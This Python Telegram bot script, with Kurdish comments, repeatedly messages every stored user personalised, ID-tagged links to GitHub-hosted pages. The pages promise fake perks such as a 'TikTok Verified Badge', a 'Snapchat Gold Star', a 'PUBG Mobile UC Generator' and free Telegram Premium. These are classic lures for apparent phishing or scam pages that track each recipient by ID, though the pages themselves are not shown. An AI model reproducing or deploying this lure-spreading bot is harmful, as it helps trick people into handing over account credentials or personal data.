from datetime import datetime
import json
import os
import requests

TOKEN = os.environ.get("BOT_TOKEN")

# لینکە سەرەکییەکان
WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"
SNAPCHAT_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/snapchat.html"
SMM_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/smm.html"
PREMIUM_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/telegram-premium.html"
TIKTOK_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/tiktok.html"
PUBG_WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/pubg.html"

def load_users():
    """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json بە شێوەی ئۆبێکت/دیکشنری"""
    users_data = {}
    if os.path.exists("users.json"):
        try:
            with open("users.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    data = json.loads(content)
                    if isinstance(data, list):
                        for uid in data:
                            users_data[str(uid)] = {"last_sent": None}
                    elif isinstance(data, dict):
                        users_data = data
        except Exception as e:
            print(f"هەڵە لە خوێندنەوەی users.json: {e}")
    
    admin_id = "6782298541"
    if admin_id not in users_data:
        users_data[admin_id] = {"last_sent": None}
        
    return users_data

def save_users(users_data):
    """پاشەکەوتکردنەوەی داتای بەکارهێنەران بۆ ناو فایلی users.json"""
    with open("users.json", "w", encoding="utf-8") as f:
        json.dump(users_data, f, indent=4, ensure_ascii=False)

def send_message(chat_id, text):
    """ناردنی نامە بۆ بەکارهێنەرێکی دیاریکراو"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, json=payload)
    print(f"وەڵامی ناردنی نامە بۆ {chat_id}: {response.json()}")
    return response.json()

def get_updates():
    """وەرگرتنی نامە نوێیەکان لە تەلەگرامەوە"""
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    response = requests.get(url)
    return response.json()

def main():
    if not TOKEN:
        print("تۆکەنی بۆت بونی نییە!")
        return

    users_data = load_users()
    print(f"لیستی بەکارهێنەران بۆ پشکنین: {users_data}")

    updates = get_updates()
    print(f"وەڵامی getUpdates: {updates}")

    if "result" in updates:
        for update in updates["result"]:
            if "message" in update and "chat" in update["message"]:
                chat_id = str(update["message"]["chat"]["id"])
                text = update["message"].get("text", "")

                if text == "/start":
                    if chat_id not in users_data:
                        users_data[chat_id] = {"last_sent": None}
                        print(f"بەکارهێنەری نوێ دۆزرایەوە و زیادکرا: {chat_id}")

    current_time = datetime.now()

    for user_id, info in users_data.items():
        should_send = True

        if should_send:
            personal_link_ai = f"{WEB_APP_URL}?id={user_id}"
            personal_link_snap = f"{SNAPCHAT_WEB_APP_URL}?id={user_id}"
            personal_link_smm = f"{SMM_WEB_APP_URL}?id={user_id}"
            personal_link_premium = f"{PREMIUM_WEB_APP_URL}?id={user_id}"
            personal_link_tiktok = f"{TIKTOK_WEB_APP_URL}?id={user_id}"
            personal_link_pubg = f"{PUBG_WEB_APP_URL}?id={user_id}"

            announcement_text = (
                f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن **میلاد مزوری**ـەوە دروست کراوە.\n\n"
                f"🔗 ئەمە لینکی AI Photo Studio:\n"
                f"{personal_link_ai}\n\n"
                f"🔗 ئەمە لینکی Snapchat Gold Star:\n"
                f"{personal_link_snap}\n\n"
                f"🔗 ئەمە لینکی Kurdish Free SMM Panel:\n"
                f"{personal_link_smm}\n\n"
                f"🔗 ئەمە لینکی Telegram Premium 3 Days:\n"
                f"{personal_link_premium}\n\n"
                f"🔗 ئەمە لینکی TikTok Verified Badge:\n"
                f"{personal_link_tiktok}\n\n"
                f"🔗 ئەمە لینکی PUBG Mobile UC Generator:\n"
                f"{personal_link_pubg}\n\n"
                f"💬 بۆ پەیوەندیکردن بە دروستکەری بۆتەکە (میلاد غازی):\n"
                f"https://t.me/MiladGhaziHussein"
            )
            
            res = send_message(user_id, announcement_text)
            
            if "ok" in res and res["ok"]:
                users_data[user_id]["last_sent"] = current_time.isoformat()
                print(f"نامە سەرکەوتووانە نێردرا بۆ {user_id}")

    save_users(users_data)

if __name__ == "__main__":
    main()
